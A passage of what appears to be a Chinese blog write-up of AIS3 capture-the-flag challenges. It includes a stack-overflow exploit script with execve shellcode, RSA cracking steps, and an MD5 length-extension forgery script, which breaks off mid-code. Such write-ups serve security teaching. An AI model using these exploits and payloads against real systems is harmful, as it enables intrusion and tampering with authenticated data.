+<p>這是一個簡單的模擬 stack 的程式<br>功能有 push, pop, show, exit<br>push 的話會要你先輸入一個 integer<br>之後程式會把這個 integer 放在 stack 上面<br>可以透過 show 功能去查看 stack 目前長什麼樣子<br>pop 的話會把 stack 上面的一個數字 pop 出來<br>exit 則是離開程式</p>
+<p>透過一些 fuzzing<br>我們可以發現當 stack 上面沒東西的時候<br>利用 pop 功能可以 leak 出一些 address，包括 ebp<br>因此我們可以利用這個功能來計算當前 stack 的位置以及我們 input buffer 的 address<br>至於 push 功能，我們會發現說如果我們一直 push 東西進 stack 的話<br>最後會發生 stack overflow, 覆蓋到 return address<br>加上沒開 DEP 的關係，因此思路跟 PWN3D2 很像<br>先利用 pop 功能 leak 出 ebp 並算出 buffer 的 address<br>之後利用 push 功能觸發 buffer overflow 並 return to shellcode 拿 shell</p>
+<p>要注意的是它 stack 上面會存有一個 address<br>是 exit 時拿來計算 esp 用的<br>因此這個 address 要小心不要被修改到<br>還有就是因為這題在蓋的時候是用 integer 在蓋<br>因此 payload 都要轉成 integer 的形式 (注意要是 int32 )</p>
+<figure class="highlight python"><figcaption><span>pwn3.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"52.69.163.194"</span></span><br><span class="line">PORT = <span class="number">3333</span></span><br><span class="line">ELF_PATH = <span class="string">""</span></span><br><span class="line">LIBC_PATH = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment">#elf = ELF(ELF_PATH)</span></span><br><span class="line"><span class="comment">#libc = ELF(LIBC_PATH)</span></span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"><span class="comment">#r = process("./pwn3")</span></span><br><span class="line"></span><br><span class="line">shellcode_byte = [ <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x89</span>, <span class="number">0xe3</span>, <span class="number">0xb0</span>, <span class="number">0x0b</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xcd</span>, <span class="number">0x80</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># constructing shellcode data</span></span><br><span class="line">shellcode = [<span class="number">0x90</span>] * <span class="number">9</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> shellcode_byte:</span><br><span class="line">	shellcode.append(c)</span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index, val <span class="keyword">in</span> enumerate(shellcode):</span><br><span class="line">	now = index % <span class="number">4</span></span><br><span class="line">	cur |= val &lt;&lt; (now*<span class="number">8</span>)</span><br><span class="line">	<span class="keyword">if</span> now == <span class="number">3</span>:</span><br><span class="line">		payload.append(numpy.int32(cur))	</span><br><span class="line">		cur = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(r)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"2"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"Top item is: "</span>)</span><br><span class="line">	item = r.recvuntil(<span class="string">"\n"</span>).strip()</span><br><span class="line">	n = numpy.int32(int(item, <span class="number">16</span>))</span><br><span class="line">	<span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(r, num)</span>:</span></span><br><span class="line">	r.sendline(<span class="string">"1"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"number:\n"</span>)</span><br><span class="line">	r.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">	temp = []</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leaking ebp</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">4</span>):</span><br><span class="line">		r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">		temp.append(pop(r))</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># calculate buffer address &amp; address for ecx</span></span><br><span class="line">	buf_addr = numpy.int32(temp[<span class="number">3</span>] - <span class="number">0x60</span>)</span><br><span class="line">	ecx_addr = numpy.int32(temp[<span class="number">3</span>] + <span class="number">0x18</span>)</span><br><span class="line">	log.info(<span class="string">"buffer address: "</span>+hex(buf_addr&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">	log.info(<span class="string">"ecx address: "</span>+hex(ecx_addr&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># restore stack</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> reversed(temp):</span><br><span class="line">		r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">		push(r, c)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># shellcode</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">		r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">		push(r, c)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># padding</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>, <span class="number">23</span>):</span><br><span class="line">		r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">		push(r, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># important address for ecx</span></span><br><span class="line">	r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">	push(r, ecx_addr)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># padding</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">24</span>, <span class="number">29</span>):</span><br><span class="line">		r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">		push(r, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># return address</span></span><br><span class="line">	r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">	push(r, buf_addr)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># invoke BOF</span></span><br><span class="line">	r.recvuntil(<span class="string">"4. exit\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">	r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="CRYPTO1"><a href="#CRYPTO1" class="headerlink" title="CRYPTO1"></a>CRYPTO1</h2><p>給了一個 vigenere.txt，很明顯的就是要我們解 <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher" target="_blank" rel="noopener">Vigenère cipher</a><br>秉持著懶人懶到底的精神<br>直接 google “vigenere cipher decoder”，找到了一堆網站<br>通通丟進去解，接著開始拼拼湊湊( 總不可能解完整 )<br>最後靠著 <a href="http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx" target="_blank" rel="noopener">這個</a> 還有 <a href="https://f00l.de/hacking/vigenere.php" target="_blank" rel="noopener">這個</a> 推出 key 的位置在 <code>http://ctf.ais3.org/files/thekeyofvigenerehahaha.txt</code><br>進去之後就是 flag 了<br>flag:<code>AIS3{i_am_scared_of_you}</code></p>
+<h2 id="CRYPTO2"><a href="#CRYPTO2" class="headerlink" title="CRYPTO2"></a>CRYPTO2</h2><p>基礎的 RSA cracking<br>之前打 CTF 都是交給強者我隊友<br>自己解一遍之後才發現有多不熟 XDrz</p>
+<p>給了一份壓縮檔，解完之後有兩個檔案<br>flag.enc 是經過 RSA 加密過後的 flag<br>rsa.py 裡面則是提供了 n 和 e</p>
+<p>看 n 似乎不大，可以爆出來<br>於是開了 <a href="http://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">yafu</a> 開始爆 pq<br>等待的同時順便將 n 丟進 <a href="http://factordb.com/" target="_blank" rel="noopener">factordb.com</a> 試試手氣<br>結果似乎已經有人將他解出來並丟到上面去了XD<br>不過用 yafu 爆也是爆得出來就是了，時間差不多 100 秒左右  </p>
+<p>有了 p 跟 q 之後就可以利用 <a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">rsatool</a> 來產生 PEM encode 後的 private key<br>openssl 指令下一下之後就可以解出 flag 了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -in flag.enc -inkey key.pem -decrypt</span><br></pre></td></tr></table></figure></p>
+<p>flag:<code>AIS3{rsaaaaaaaaA_orz}</code></p>
+<h2 id="CRYPTO3"><a href="#CRYPTO3" class="headerlink" title="CRYPTO3"></a>CRYPTO3</h2><p>耗費最多心力的一題，解完之後經驗值又增加了 XD</p>
+<p>給了一份 buy.py<br><figure class="highlight python"><figcaption><span>buy.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> parse_qsl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> KEY</span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(KEY[:<span class="number">16</span>] + s).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_number</span><span class="params">(msg)</span>:</span></span><br><span class="line">	num = raw_input(msg).strip()</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		num = int(num)</span><br><span class="line">	<span class="keyword">except</span> ValueError:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pick_orange</span><span class="params">(num)</span>:</span></span><br><span class="line">	data = <span class="string">'num=%d&amp;price=10'</span> % num</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'OK, this is your order information. You can check out with this code'</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'%s-----%s'</span> % (data, md5(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_out</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> MONEY</span><br><span class="line">	s = raw_input(<span class="string">'Input your order information: '</span>).strip()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'-----'</span> <span class="keyword">in</span> s:</span><br><span class="line">		data, hmac = s.split(<span class="string">'-----'</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> md5(data) == hmac:</span><br><span class="line">			info = dict( parse_qsl(data) )</span><br><span class="line">			num   = info.get(<span class="string">'num'</span>, <span class="number">0</span>)</span><br><span class="line">			price = info.get(<span class="string">'price'</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				num = int(num)</span><br><span class="line">				price = int(price)</span><br><span class="line">			<span class="keyword">except</span> ValueError:</span><br><span class="line">				num = <span class="number">0</span></span><br><span class="line">				price = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> isinstance(num, int) <span class="keyword">and</span> isinstance(price, int):</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'You buy %d oranges'</span> % num</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'Per price of orange is $%d'</span> % price</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> num * price &gt; MONEY:</span><br><span class="line">					<span class="keyword">print</span> <span class="string">'You are too poor'</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					MONEY = MONEY - num*price</span><br><span class="line">					<span class="keyword">print</span> <span class="string">'OK, you bought'</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Order information not correct'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> MONEY, FLAG</span><br><span class="line">	<span class="keyword">if</span> MONEY &gt; <span class="number">1000000</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Cong, the flag is %s'</span> % FLAG</span><br><span class="line">		exit()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Oh no, you are too poor'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_money</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> MONEY</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'You now have $%d'</span> % MONEY</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">motd</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'''</span></span><br><span class="line"><span class="string">	-----------------------------------</span></span><br><span class="line"><span class="string">	Welcome to Online Shopping Mall.</span></span><br><span class="line"><span class="string">	[1] Pick oranges into shopping cart</span></span><br><span class="line"><span class="string">	[2] Check out</span></span><br><span class="line"><span class="string">	[3] Show money</span></span><br><span class="line"><span class="string">	[4] Get flag</span></span><br><span class="line"><span class="string">	[5] Exit</span></span><br><span class="line"><span class="string">	-----------------------------------</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">			motd()</span><br><span class="line">			choice = get_number(<span class="string">'Input your choice: '</span>)</span><br><span class="line">			<span class="keyword">if</span> 	 choice == <span class="number">1</span>:</span><br><span class="line">				num = get_number(<span class="string">'How many oranges do you want to buy ?'</span>)</span><br><span class="line">				<span class="keyword">if</span> num &gt; <span class="number">0</span>:</span><br><span class="line">					pick_orange(num)</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					<span class="keyword">print</span> <span class="string">'What do you do ?'</span></span><br><span class="line">			<span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">				check_out()</span><br><span class="line">			<span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">				show_money()</span><br><span class="line">			<span class="keyword">elif</span> choice == <span class="number">4</span>:</span><br><span class="line">				get_flag()</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'bye'</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">'/dev/urandom'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">		rand = fp.read(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'challenge: 0x%s'</span> % rand.encode(<span class="string">'hex'</span>)</span><br><span class="line">	res = raw_input(<span class="string">'Enter response: '</span>).strip()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> hashlib.md5( rand + res ).hexdigest().startswith(<span class="string">'fffff'</span>):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Challenge failed'</span></span><br><span class="line">		exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alarm</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">handler</span><span class="params">(signum, frame)</span>:</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'Timeout!'</span></span><br><span class="line">		exit()</span><br><span class="line">	signal.signal(signal.SIGALRM, handler)</span><br><span class="line">	signal.alarm( <span class="number">30</span> )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	sys.stdout = os.fdopen(sys.stdout.fileno(), <span class="string">'w'</span>, <span class="number">0</span>)</span><br><span class="line">	sys.stdin  = os.fdopen(sys.stdin.fileno(), <span class="string">'r'</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sys.dont_write_bytecode = <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">from</span> conf <span class="keyword">import</span> KEY, FLAG, MONEY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		challenge()</span><br><span class="line">		alarm()</span><br><span class="line">		main()</span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+<p>看懂之後有兩個重點:</p>
+<ol>
+<li>利用他給的 challenge 爆 md5, 先過第一關</li>
+<li>開始買橘子，買完之後錢要 &gt; 1000000 來拿 flag</li>
+</ol>
+<p>第一關還好，寫個 script 爆一下就 ok 了<br>重點是第二關<br>買橘子在 check out 的時候會要先給它一個 order information<br>形式為: <code>&quot;num=XXX&amp;price=XXX-----[md5 hash]&quot;</code><br>其中 md5 hash 那邊是指 <code>&quot;num=XXX&amp;price=XXX&quot;</code> 的 md5 hash</p>
+<p>程式會將 <code>-----</code> 之前的字串視為 data, 之後的字串 ( 就是 md5 hash ) 視為 hmac<br>我們輸入 order information 的時候，程式會先做以下檢查<br><code>md5(key[:16]+data) == hmac</code> ( key 未知 )<br>通過的話才會讓我們 check out (正式扣錢，買到橘子)</p>
+<p>問題在於我們一開始的錢是 100 塊<br>理論上不管怎麼買都不可能買到 1000000<br>手上握有的資訊就只有 <code>&quot;num=XXX&amp;price=10&quot;</code> ( XXX 可控 ) 和其 md5 hash 值<br>因此在這裡卡了一段時間</p>
+<p>之後才發現有個 attack 叫做 Length Extension Attack (LEA)<br>詳情可參考 <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="noopener">這篇</a> 和 <a href="http://ddaa.logdown.com/posts/194524-plaid-ctf-2014-crypto-250-parlor" target="_blank" rel="noopener">這篇</a><br>簡單來說就是如果我有辦法知道 <code>md5(a)</code> 的值<br>那麼我就可以預測 <code>md5(a + padding + append)</code> 的值<br>其中 <code>padding</code> 字串須透過計算來得到<br>而 <code>append</code> 則是我們想要附加上去的字串</p>
+<p>也就是說，假設今天我們知道 <code>key[:16]+&quot;num=11111111&amp;price=10&quot;</code> 的 md5 hash 值<br>我們就可以預測 <code>key[:16]+&quot;num=11111111&amp;price=10&quot; + [padding] + &quot;&amp;price=-1&quot;</code> 的 md5 hash 值<br>如此一來就可以構造假的 order information 來繞過檢查，買到 11111111 個價值 -1 塊的橘子<br>我們的錢就可以突破 1000000 了<br>( 注意在 checkout 時 price 的值是用 <code>info.get(&#39;price&#39;, 10)</code> 來得到的<br>因此 <code>...&amp;price=10abcdefg...&amp;price=-1</code>, 所拿到的值最終會是 -1 )</p>
+<p>網路上也已經有工具幫我們做這件事了 – <a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a><br>可以直接算出 padding 和預測出來的 md5 hash 值<br>不過這題很靠背的一點是在於 key[:16] 這行<br>如果 key 不滿 16 字元的話就會取到該字串長度為止<br>所以 key 不一定是 16 字元，長度有可能是 1 ~ 16 = =<br>超級心機啊，太淫蕩惹 Orz<br>害我一開始本地端測試 ok 之後丟到 server 那邊發現怎麼一直不 work<br>原來就是因為這個原因…<br>最後直接手動建了 key length = 1 ~ 16 的 payload 和 hash 值一個一個送<br>才發現 key length = 12…</p>
+<figure class="highlight python"><figcaption><span>crypto3.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"52.69.163.194"</span></span><br><span class="line"><span class="comment">#HOST = "localhost"</span></span><br><span class="line">PORT = <span class="number">7788</span></span><br><span class="line"></span><br><span class="line">all_str = [chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pass_challenge</span><span class="params">(seed)</span>:</span></span><br><span class="line">	log.info(<span class="string">"seed: "</span> + seed.encode(<span class="string">'hex'</span>))</span><br><span class="line">	<span class="keyword">for</span> cnt <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(all_str, repeat=cnt):</span><br><span class="line">			resp = <span class="string">''</span>.join(c)</span><br><span class="line">			test = seed + resp</span><br><span class="line">			<span class="keyword">if</span> hashlib.md5( test ).hexdigest().startswith(<span class="string">'fffff'</span>):</span><br><span class="line">				log.info(<span class="string">"found: "</span> + resp.encode(<span class="string">'hex'</span>))</span><br><span class="line">				log.info(<span class="string">"verify: "</span> + hashlib.md5(test).hexdigest())</span><br><span class="line">				<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">	r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">"num=11111111&amp;price=10\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00&amp;price=-1"</span></span><br><span class="line"></span><br><span class="line">	final_payload = payload + <span class="string">"-----571297fb4b5b065155bc5a3faa2a9a3d"</span></span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">"challenge: 0x"</span>)</span><br><span class="line">	seed = r.recv(<span class="number">16</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">	r.recvuntil(<span 